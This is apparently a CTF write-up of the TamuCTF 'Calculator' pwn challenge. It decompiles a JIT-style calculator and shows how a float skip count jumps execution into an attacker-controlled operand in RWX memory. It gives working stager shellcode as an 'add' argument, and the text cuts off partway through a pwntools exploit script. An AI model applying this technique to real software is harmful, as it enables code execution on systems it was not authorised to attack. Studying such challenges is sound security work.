I">¶<p><a href="https://tamuctf.com">TamuCTF</a> Started last thursday, and took place over 3 days, ending on the 25th (Sunday). The CTF had many different categories, however since I only know (a little bit) pwn I found myself focusing on exclusively those challenges. Of those I managed to solve 8 out of the 11 available. One of these challenges was called <strong>Calculator</strong>.</p>
<h2 id="what-is-it">What is it?</h2>
<p>When doing CTF challenges/Attacking real targets, people generally say the first step you need to take is to understand the general functionality of the program, then you can understand where vulnerabilities <em>could</em> be found, so lets take a look:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116205887-1c4fda80-a736-11eb-8607-d8e346699349.PNG" alt="1" /></p>

<p>Looks like a calculator (duhh) but with the added feature that instead of just giving numbers and symbols (say ‚Äú1+1‚Äù) then evaluating them, we use assembly-like syntax to specify the operation we want. Its sort of unfair to start this way, as I already knew that specifying ‚Äòadd‚Äô would yeald results, so i‚Äôll tell you that i spent ~10mins just messing around with the binary without delving too deep, so thats why I know.</p>

<p>The program has another option we didn‚Äôt use, being ‚ÄúPrint Instructions‚Äù. Take a look:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116206992-4e157100-a737-11eb-9cb3-f057169ad64a.PNG" alt="2" /></p>

<p>So that just prints what we entered, cool. I think now we have a general idea of what the program does, and how to use it:</p>

<ul>
  <li>‚ÄúAdd instruction‚Äù adds an instruction to a buffer/list of commands, this can then be retrieved by ‚ÄúPrint Instructions‚Äù for printing.</li>
  <li>‚ÄúPrint Instructions‚Äù lists out the commands/instructions we added through ‚ÄúAdd instruction‚Äù.</li>
  <li>‚ÄúEvaluate‚Äù does some magic and eventually spits out the result of our sum.</li>
</ul>

<p>Another thing we can do is try and enter some garbled mess into ‚ÄúAdd Instruction‚Äù and see what happens:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116208160-84072500-a738-11eb-9910-357ed32e50c2.PNG" alt="3" /></p>

<p>As you can see, the program has to do some parsing of our input in ‚ÄúEvaluate‚Äù, and obviously doesn‚Äôt even try to interpret our string of ‚ÄòA‚Äôs.
Now we can get into the nitty gritty in ghidra to understand the <em>how</em> and <em>why</em> of this program.</p>

<h2 id="how">How?</h2>

<p>Starting in main, we see that the decompilation of this function looks very clean, so there is no need to look at ASM for the time being (phew):
(Note that I have added annotations to some of the source code in the other functions and renamed others, so the decompilation will be different on your side)</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116210149-84a0bb00-a73a-11eb-8e6d-8781f75f9cb4.PNG" alt="4" /></p>

<p>As you can see upon starting main we disable buffering for stdout with <code class="language-plaintext highlighter-rouge">setvbuf()</code>. This means we should get output from the program only when it sends it, and no-where
else. This makes it easier to recieve data when we program our exploit script later. We then <code class="language-plaintext highlighter-rouge">malloc()</code> some memory with the size of <code class="language-plaintext highlighter-rouge">(instruction_count + 1) &lt;&lt; 3</code> (an easier way to understand this is as <code class="language-plaintext highlighter-rouge">(instruction_count + 1) * 8</code>) and store a pointer to that memory in <code class="language-plaintext highlighter-rouge">instructions</code>.</p>

<p>We can already (correctly) speculate as to the purpose of these variables; the <code class="language-plaintext highlighter-rouge">instructions</code> variable holds a pointer to heap memory where our entered instructions are stored in some way, and <code class="language-plaintext highlighter-rouge">instruction_count</code> stores the number of instructions/commands entered, nice.</p>

<p>We then enter a command loop with <code class="language-plaintext highlighter-rouge">do {} while(True)</code> that will keep looping until we Ctrl+C/Kill the program another way, and contained inside this loop is code for our 3 choices. We can see some already recognisable functions names <code class="language-plaintext highlighter-rouge">add_instruction()</code> and <code class="language-plaintext highlighter-rouge">print_instruction()</code> which both do as you would expect. But then we see what happens for the 3rd choice, or ‚ÄúEvaluate‚Äù:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116214516-aef47780-a73e-11eb-915f-9fbecdedc74d.PNG" alt="5" /></p>

<p>‚ÄòJit‚Äô stands for ‚ÄòJust in Time‚Äô, and generally refers to a type of compilation. This would hint that maybe our simple calculator program is something a little more than
what it seems‚Ä¶</p>

<p>You may wonder why I have named the two variables ‚Äòchoice‚Äô and ‚Äòdecision‚Äô as such, when they are practically the same thing. This is because I lack creativity and couldn‚Äôt come up with any better names.</p>

<p>Anyway, we should start from the top. We can tackle the beast that is the <code class="language-plaintext highlighter-rouge">jit()</code> function once we understand how the others work, starting with <code class="language-plaintext highlighter-rouge">add_instruction()</code>.</p>

<h3 id="add_instruction">add_instruction()</h3>

<p>Again (thanks ghidra) the decompilation is very clean, so we can simply use it again. Before we do this I feel that its important to mention you shouldn‚Äôt always trust a decompiler to tell you the truth of things, I just found that it was perfect for this challenge, but don‚Äôt make it a habit. Anyway:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116218998-05fc4b80-a743-11eb-8403-041e05a9e0d2.PNG" alt="6" /></p>

<p>Here‚Äôs where my nonsensical annotations begin, and never stop lul. Firstly, the function allocates <code class="language-plaintext highlighter-rouge">0x1e</code> (30) bytes of space, initialises it with zeros using <code class="language-plaintext highlighter-rouge">memset()</code> and then reads into this memory from <code class="language-plaintext highlighter-rouge">stdin</code>. So any given command can be a max of <code class="language-plaintext highlighter-rouge">0x1e</code> bytes long, cool.</p>

<p>We then store a pointer to our input in the area allocated for holding <code class="language-plaintext highlighter-rouge">instructions</code> (recall that the area allocated is <code class="language-plaintext highlighter-rouge">(instruction_count + 1) * 8</code> big). This is actually where <code class="language-plaintext highlighter-rouge">print_instruction()</code> will look when trying to print out our instructions, so this snippet just stores a pointer to be dereferenced and printed later, but we will get there when we get there.</p>

<p>The program then sets <code class="language-plaintext highlighter-rouge">instruction_mem_size = instruction_count + 2</code> and increments <code class="language-plaintext highlighter-rouge">instruction_count</code>. The latter makes sense; of course whenever <code class="language-plaintext highlighter-rouge">add_instruction()</code> is called we expect to add another instruction, but what is the purpose of <code class="language-plaintext highlighter-rouge">instruction_mem_size</code> being incremented? Well if we look a little further on we can see it being used to malloc some space: <code class="language-plaintext highlighter-rouge">__dest = malloc((long)instruction_mem_size &lt;&lt; 3);</code> and then into said space is copied the contents of the <code class="language-plaintext highlighter-rouge">instructions</code> heap memory. Since we increment it by 2, rather than just 1, this gives us an extra ‚Äú1*8‚Äù in space. This space is then used to store the pointer to our input that is used by <code class="language-plaintext highlighter-rouge">print_instruction()</code>.</p>

<p>Now the program <code class="language-plaintext highlighter-rouge">free()</code>s the <code class="language-plaintext highlighter-rouge">instructions</code> memory, and sets it to the new pointer to memory we just allocated, <code class="language-plaintext highlighter-rouge">__dest</code>.</p>

<p>So, to recap. Whenever we call <code class="language-plaintext highlighter-rouge">add_instruction()</code> we read an instruction/whatever happens to be sent via stdin into a heap buffer. A pointer to this buffer is then written
into the <code class="language-plaintext highlighter-rouge">instructions</code> heap memory, along with any other instruction buffers that may already be there. We than allocate another heap buffer that is equal to the size of the previous buffer + 8. Then we free the old heap buffer, and set <code class="language-plaintext highlighter-rouge">instructions</code> to the new memory. Here‚Äôs what that would look like in gdb:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116226666-2d571680-a74b-11eb-89f4-70edbf73364d.PNG" alt="7" /></p>

<p>With the address <code class="language-plaintext highlighter-rouge">0x5555555592a0</code> being the <code class="language-plaintext highlighter-rouge">__dest</code> pointer.</p>

<h3 id="print_instruction">print_instruction()</h3>

<p>Now we can have a breather, as this function should already be pretty farmiliar to you, its also quite simple:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116227135-b40bf380-a74b-11eb-89dc-1369bddf80f3.PNG" alt="8" /></p>

<p>All it does is iterate through the <code class="language-plaintext highlighter-rouge">instructions</code> heap memory, dereferencing any pointers it may find and printing them. As I point out at the top, this will also print out any garbage we add to our instructions buffer, but this is mainly due to <code class="language-plaintext highlighter-rouge">add_instruction()</code> not doing any checks on whether our input is a valid instruction/command. This isn‚Äôt particularly important, just I would mention it.</p>

<h2 id="jit">jit()</h2>

<p>One of the hallmarks of a JIT compiler is that some language (such as python or javascript) is converted into Byte-code, and then that bytecode is then fed into an interpreter such as the python interpreter that then converts that bytecode into machine code and executes it. This program does implement JIT, although it takes out the bytecode and instead just converts our commands into machine code, lets take a look: 
(The function is too big for a screenshot so I will paste the decompiled code here)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">jit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">choice_1</span><span class="p">;</span>
  <span class="n">ulonglong</span> <span class="n">arg1</span><span class="p">;</span>
  <span class="kt">double</span> <span class="n">skipped_instructions_float</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">nullptr</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">skipped_instructions</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">undefined8</span> <span class="n">executed_code</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">instr_name</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size_of_code</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">real_skipped_instructions</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iter</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="o">*</span><span class="n">code_ptr</span><span class="p">;</span>
  
  <span class="n">puts</span><span class="p">(</span><span class="s">"How many instructions would you like to skip?"</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">skipped_instructions</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
                    <span class="cm">/* converts string input from fgets() into an actual number so it can be used to
                       skip some instructions. Interestingly enough this is a float. Hmmmm.... */</span>
  <span class="n">skipped_instructions_float</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="n">skipped_instructions</span><span class="p">);</span>
                    <span class="cm">/* each encoding of instructions = 13 bytes */</span>
  <span class="n">real_skipped_instructions</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">skipped_instructions_float</span> <span class="o">*</span> <span class="mi">13</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">size_of_code</span> <span class="o">=</span> <span class="n">instruction_count</span> <span class="o">*</span> <span class="mh">0xd</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
                    <span class="cm">/* map some memory and store a pointer to the mapped area in 'code_ptr' */</span>
  <span class="n">code_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Elf64_Ehdr_00100000</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
                    <span class="cm">/* make new code area rwx (juicy) */</span>
  <span class="n">mprotect</span><span class="p">(</span><span class="n">code_ptr</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
                    <span class="cm">/* add instructions at the end of our allocated code that disassemble to:
                       48 89 C8    mov rax, rcx
                       C3          ret
                       This is the code that supplies the return value that we check at the end, and
                       returns execution back to jit() (return value goes in rax) */</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x48</span><span class="p">;</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x89</span><span class="p">;</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc3</span><span class="p">;</span>
                    <span class="cm">/* iterate through all charps in instructions */</span>
  <span class="n">iter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">iter</span> <span class="o">&lt;</span> <span class="n">instruction_count</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">instr_name</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">instructions</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iter</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
                    <span class="cm">/* 48 B8 00 00 00 00 00 00 00 FF    movabs rax, 0xff00000000000000 */</span>
    <span class="o">*</span><span class="n">code_ptr</span> <span class="o">=</span> <span class="mh">0x48</span><span class="p">;</span>
    <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xb8</span><span class="p">;</span>
                    <span class="cm">/* extract our number we specified with the instruction. E.g, if we said "add
                       123"
                       this would extract "123" and convert it to unsigned long long */</span>
    <span class="n">arg1</span> <span class="o">=</span> <span class="n">strtoull</span><span class="p">(</span><span class="n">instr_name</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">nullptr</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
                    <span class="cm">/* set arg1 to the operand of the movabs rax instruction  */</span>
    <span class="o">*</span><span class="p">(</span><span class="n">ulonglong</span> <span class="o">*</span><span class="p">)(</span><span class="n">code_ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">arg1</span><span class="p">;</span>
    <span class="n">code_ptr</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x48</span><span class="p">;</span>
    <span class="n">code_ptr</span><span class="p">[</span><span class="mh">0xc</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc1</span><span class="p">;</span>
    <span class="n">code_ptr</span> <span class="o">=</span> <span class="n">code_ptr</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
    <span class="n">choice_1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">instr_name</span><span class="p">,</span><span class="s">"add"</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
                    <span class="cm">/* if "add" str is found, encode an add instruction */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">choice_1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* 48 01 C1    add rcx, rax */</span>
      <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">choice_1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">instr_name</span><span class="p">,</span><span class="s">"sub"</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
                    <span class="cm">/* if "sub" str is found, encode a sub instruction */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">choice_1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* 48 29 C1    sub rcx, rax */</span>
        <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x29</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="n">choice_1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">instr_name</span><span class="p">,</span><span class="s">"xor"</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
                    <span class="cm">/* if "xor" str is found, encode an xor instruction */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">choice_1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* 48 31 C1    xor rcx, rax */</span>
          <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x31</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
                    <span class="cm">/* move onto encoding the next instruction */</span>
    <span class="n">code_ptr</span> <span class="o">=</span> <span class="n">code_ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">iter</span> <span class="o">=</span> <span class="n">iter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="cm">/* execute jit()ted code, and store the return value (whatevery happened to be
                       in rax when the function exited) in 'executed code' */</span>
  <span class="n">executed_code</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)(</span><span class="kt">long</span><span class="p">)(</span><span class="n">real_skipped_instructions</span> <span class="o">+</span> <span class="mh">0x100000</span><span class="p">))();</span>
                    <span class="cm">/* get return value from executed code */</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"result = %llu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">executed_code</span><span class="p">);</span>
  <span class="n">munmap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Elf64_Ehdr_00100000</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So‚Ä¶ Where to start? Well first we are prompted to enter ‚ÄúHow many instructions would you like to skip?‚Äù. Our input is then converted to a float (keep note of this, as it will be extremely important later on) and stored, and then multiplied by 13. Now the program calculates how long our code will need to be with <code class="language-plaintext highlighter-rouge">size_of_code = instruction_count * 0xd + 4;</code> we then call <code class="language-plaintext highlighter-rouge">mmap()</code> with this value as the length argument and attempt to map that amount of memory from the address <code class="language-plaintext highlighter-rouge">0x100000</code> (this is static, and never changes). When that the memory is mapped we call <code class="language-plaintext highlighter-rouge">mprotect()</code> and set it to be readable, writable, and executable.</p>

<p>Another common characteristic of JIT is that it will set the permissions on memory pages to be readable, writable, and executable and never change them back. This is because it will take the byte-code, convert it into machine code, write it to memory and execute it all together. Calling a syscall like <code class="language-plaintext highlighter-rouge">mprotect()</code> to periodically to reset permissions on the memory ranges when they don‚Äôt need to be, for instance writable, but only executable would take time, so often JIT pages will be all 3 at once. This is also the case for this program as it writes code into this memory, then executes it all in one.</p>

<p>Then we do something odd:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116240964-592ec800-a75c-11eb-9ecd-935b2ebf6350.PNG" alt="9" /></p>

<p>Here you can see that we modify the memory at the end of our mapped space at indexes <code class="language-plaintext highlighter-rouge">code_ptr[size_of_code - 1]</code> to <code class="language-plaintext highlighter-rouge">code_ptr[size_of_code - 4]</code> and each time we write
a byte. This is the first time we write code into the new memory, even though these bytes just look like data the comment explains that these actually disassemble onto <code class="language-plaintext highlighter-rouge">mov rax, rcx ; ret</code>. These are placed at the end of our code, meaning these will be executed after all our other stuff is done with. This specific <code class="language-plaintext highlighter-rouge">ret</code> instruction is responsible for returning back into <code class="language-plaintext highlighter-rouge">jit()</code> once we have finished execution. If you were wondering why <code class="language-plaintext highlighter-rouge">size_of_code = instruction_count * 0xd + 4;</code> rather than <code class="language-plaintext highlighter-rouge">size_of_code = instruction_count * 0xd;</code>, its because these instructions make up for those last 4 bytes.</p>

<p>Next we enter a loop that iterates through <code class="language-plaintext highlighter-rouge">instruction_count</code>, meaning for every instruction this loop will execute. In this loop is where the magic of ‚ÄúEvaluate‚Äù happens.</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116242813-356c8180-a75e-11eb-8dca-d022b068f700.PNG" alt="10" /></p>

<p>Firstly, we get one of the charps from our <code class="language-plaintext highlighter-rouge">instructions</code> variable (recall that all <code class="language-plaintext highlighter-rouge">instructions</code> really is just a list of charps) and store it in <code class="language-plaintext highlighter-rouge">instr_name</code>. Next we write part of another instruction to our memory, this time being a <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction, we then parse the string at <code class="language-plaintext highlighter-rouge">instr_name</code> and take out the argument we supply to our command. Then convert it to an <code class="language-plaintext highlighter-rouge">unsigned long long</code> using <code class="language-plaintext highlighter-rouge">strtoull()</code>. We then write this new number into the <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction as its argument. <code class="language-plaintext highlighter-rouge">unsigned long long</code> is 8 bytes of 64 bits long, meaning that the argument for <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> will be either padded out to 8 bytes or take all the 8 bytes of the number we supply.</p>

<p>This means that we completely control the operand, all 8 bytes of it. Here‚Äôs what that looks like in gdb:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116245484-e7a54880-a760-11eb-9c5d-dbff4d67f247.PNG" alt="12" /></p>

<p>When we then call the code in <code class="language-plaintext highlighter-rouge">jit</code>:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116245492-ea07a280-a760-11eb-9373-21546a12151b.PNG" alt="13" /></p>

<p>This is another thing that will be very relevent soon.</p>

<p>In the screenshot above, you can also see that our ‚Äúadd‚Äù command was encoded as an actual <code class="language-plaintext highlighter-rouge">add</code> instruction, now were going to see how:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116246165-a3667800-a761-11eb-8566-1c1e04d0930e.PNG" alt="14" /></p>

<p>10 bytes later in the code (<code class="language-plaintext highlighter-rouge">code_ptr[10]</code>) after we have finished encoding the <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction, we see some more bytes that could be instructions being written, 
one at <code class="language-plaintext highlighter-rouge">code_ptr[10]</code> and one at <code class="language-plaintext highlighter-rouge">code_ptr[0xc]</code> (12). The code_ptr is then incremented by 10, so that it points where <code class="language-plaintext highlighter-rouge">code_ptr[10]</code> used to point. And a different byte is written to <code class="language-plaintext highlighter-rouge">code_ptr[1]</code> (<code class="language-plaintext highlighter-rouge">code_ptr[11]</code>) depending on what operation we specified in our input string. In the case of our previous screenshot, ‚Äúadd‚Äù was used and so ‚Äò1‚Äô is written in between <code class="language-plaintext highlighter-rouge">code_ptr[10]</code> (0x48) and <code class="language-plaintext highlighter-rouge">code_ptr[12]</code> (0xc1), making the bytes equal to <code class="language-plaintext highlighter-rouge">\x48\x01\xc1</code>, creating an <code class="language-plaintext highlighter-rouge">add rcx, rax</code> instruction:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116247855-2b994d00-a763-11eb-9d60-5b88288748c4.PNG" alt="15" /></p>

<p>The same thing happens for the other instruction/commands ‚Äúxor‚Äù and ‚Äúsub‚Äù. I never needed to touch these though. We now finally come to the end of the <code class="language-plaintext highlighter-rouge">jit()</code> function:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116248153-7d41d780-a763-11eb-837c-7f4da5230367.PNG" alt="16" /></p>

<p><code class="language-plaintext highlighter-rouge">code_ptr</code> now points to the byte in between <code class="language-plaintext highlighter-rouge">\x48</code> and <code class="language-plaintext highlighter-rouge">\xc1</code>. So the program needs to increment the pointer by ‚Äò3‚Äô if it wants the next iteration of the loop to start writing instructions into memory that is unused, so it does just that. <code class="language-plaintext highlighter-rouge">iter</code> is then incremented by one. This loop will continue as long as <code class="language-plaintext highlighter-rouge">iter &lt; instruction_count</code>, so every command will have the operations above conducted on them. When all commands have been processed, its time to exit the loop.</p>

<p>Now that all the commands have been interpreted and translated into machine code, and all boilerplate instructions have been written into the memory we can finally call/run the code. First we add the number of instructions * 13.0 that we want to skip. Why times 13? Well each command is translated into 13 bytes of x86, as you have observed. So it would make sense to add 13 if you wanted to start at the next instruction, but after we have done this calculation the code is run and thanks to the <code class="language-plaintext highlighter-rouge">ret</code> instruction hardcoded at the end can return back into <code class="language-plaintext highlighter-rouge">jit()</code>. The return value being placed in <code class="language-plaintext highlighter-rouge">rax</code> beforehand. This value actually contains the result of all our commands/operations, and is then printed by <code class="language-plaintext highlighter-rouge">printf()</code>. The program then returns into <code class="language-plaintext highlighter-rouge">main()</code> and the cycle continues indefinitely.</p>

<h2 id="exploitation">Exploitation</h2>

<p>I tried to put specific emphasis on a couple of things when describing how <code class="language-plaintext highlighter-rouge">jit()</code> worked, namely that we can control all the bytes in the <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction operand, and that the equation to skip instructions uses a <code class="language-plaintext highlighter-rouge">float</code> value. The main thing to understand is the float value. Let me demonstrate:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116250955-1bcf3800-a766-11eb-9676-8f299dd7ba12.PNG" alt="17" /></p>

<p>Here i make 4 ‚Äúadd‚Äù instructions. Now i‚Äôm going to ‚ÄúEvaluate‚Äù and choose to skip 4 instructions. This should result in skipping all of my commands:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116251417-8bddbe00-a766-11eb-9d2b-48850f639e65.PNG" alt="18" /></p>

<p>As you can see, this is exactly what happened. We end up at the <code class="language-plaintext highlighter-rouge">mov rax, rcx ; ret</code> instruction at the end of the code. We skip a total of 0x34 bytes, or 13 * 4 bytes. Now i will enter the same instructions again, this time choosing to skip ‚Äò1.2‚Äô instructions. Watch what happens next:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116252072-250cd480-a767-11eb-9aed-9a37ac74997c.PNG" alt="19" /></p>

<p>The first thing before I show you were EXACTLY we return, is looking at the address. It should be a multiple of 13, right? No, since we were allowed to enter a float value, we can choose any value we wish. Take 1.2 for example. ‚Äò1*13 = 13‚Äô this is okay, but: ‚Äò1.2*13 = 15.6‚Äô, 15.6 is then rounded to 16 up when the <code class="language-plaintext highlighter-rouge">real_skipped_instructions</code> value is typecasted into an integer here: <code class="language-plaintext highlighter-rouge">real_skipped_instructions = (int)(skipped_instructions_float * 13.0);</code>. And 16 = 0xf. Now we will see what we return into:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116252921-ecb9c600-a767-11eb-9a5c-5a5cafe7f1fd.PNG" alt="20" /></p>

<p>If you recall, the number we specified as our ‚Äúadd‚Äù command argument was 10416984888683040912, and this in hex is 0x9090909090909090. I‚Äôm sure you know where this is going lul. So we can completely control the operands, and can jump into said operand through manipulating the <code class="language-plaintext highlighter-rouge">real_skipped_instructions</code> variable. But we only have 8 bytes :(. 
What on earth can we do with 8 bytes? Everything.</p>

<p>Remember back when we <code class="language-plaintext highlighter-rouge">mprotect()</code>ed the memory to be rwx? That means its writable aaaand we have code execution. Could we call <code class="language-plaintext highlighter-rouge">read()</code> with the buffer/rsi as a value in this memory? Looking at the register layout at the time of jumping into the code, and we can see that:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116254263-1b846c00-a769-11eb-9e16-065df2801ae8.PNG" alt="21" /></p>

<p>This could certainly work (maybe). Using <a href="https://syscalls.w3challs.com/?arch=x86_64">This</a> we can figure out that in order to call read(), we need a couple things:</p>
<ul>
  <li><strong>RAX</strong> = 0 (read syscall number)</li>
  <li><strong>RDI</strong> = 0 (stdin, or any other fd we can control)</li>
  <li><strong>RSI</strong> = a value in our rwx memory that we can execute code at</li>
  <li><strong>RDX</strong> = a valid size</li>
</ul>

<p>Looking at the register state we see that:</p>
<ul>
  <li><strong>RAX</strong> = already 0</li>
  <li><strong>RDI</strong> = needs changing to 0</li>
  <li><strong>RSI</strong> = Nope</li>
  <li><strong>RDX</strong> = is a valid size, but needs to be in RSI</li>
</ul>

<p>So we need a snippet of asm that can clear rdi, swap rsi and rdi, and <code class="language-plaintext highlighter-rouge">syscall</code> that 8 bytes or less. I came up with the following, and packed it as a number:</p>

<pre><code class="language-asm">  xor rdi, rdi
  xchg rsi, rdx
  syscall
</code></pre>
<p><code class="language-plaintext highlighter-rouge">\x48\x31\xff\x48\x87\xd6\x0f\x05</code> == 364776757699490120</p>

<p>This should be able to call <code class="language-plaintext highlighter-rouge">read()</code> with an unlimited size to write/read in data from stdin, we can test this:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116256218-e547ec00-a76a-11eb-890e-ae18eb8ad950.PNG" alt="22" />
<img src="https://user-images.githubusercontent.com/73792438/116256349-04df1480-a76b-11eb-8287-02c43223f9d2.PNG" alt="23" />
<img src="https://user-images.githubusercontent.com/73792438/116256480-2213e300-a76b-11eb-9071-d7df0329b441.PNG" alt="24" /></p>

<p>So it certainly looks like <code class="language-plaintext highlighter-rouge">read()</code> worked. Now what if we were able to write some code here that actually did something?
Heres my exploit script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># add 364776757699490120
</span>
<span class="c1"># Load shellcode - just reads 'flag.txt' then sends it to stdout
</span><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"catflag"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="n">flag_pls</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="c1">#p = remote('127.0.0.1', 4444)
</span>
